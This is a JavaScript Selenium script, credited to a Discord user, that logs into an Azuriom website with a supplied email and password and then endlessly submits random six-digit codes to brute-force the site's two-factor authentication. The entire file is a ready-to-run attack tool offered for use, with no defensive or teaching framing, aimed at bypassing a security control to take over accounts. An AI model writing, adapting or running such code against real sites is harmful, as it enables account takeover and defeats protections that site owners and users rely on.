// Azuriom 2fa bruteforce V1.0.0
// by mrcyci6 on discord
const webdriver = require('selenium-webdriver');
const {By, until} = require('selenium-webdriver')

async function bruteforce() {

    try {
        const driver = new webdriver.Builder()
            .forBrowser('chrome')
            .build();

        await driver.get('https://www.domain.fr/user/login');

        // CONNEXION
        const email = await driver.findElement(By.css('#email'));
        const password = await driver.findElement(By.css('#password'));

        email.sendKeys("email")
        password.sendKeys("masterpassword")
        let status = await driver.executeScript(`return document.readyState`);
        if(status == "complete") {
            await driver.executeScript(`var bouton = document.querySelector('.btn-primary');
bouton.click();`)
        }
    
        status = await driver.executeScript(`return document.readyState`);
        if(status == "complete") {
            while(true) {
                await driver.executeScript(`
                    var number = Math.floor(Math.random() * 900000);
                    number = String(number).padStart(6, '0');
                    var code = document.getElementById('code');
                    code.value = number;
                    var bouton = document.querySelector('.btn-primary');
                    bouton.click();
                `)
            }
        }

    } catch(e) {
        console.log(e)
    }
}

bruteforce();
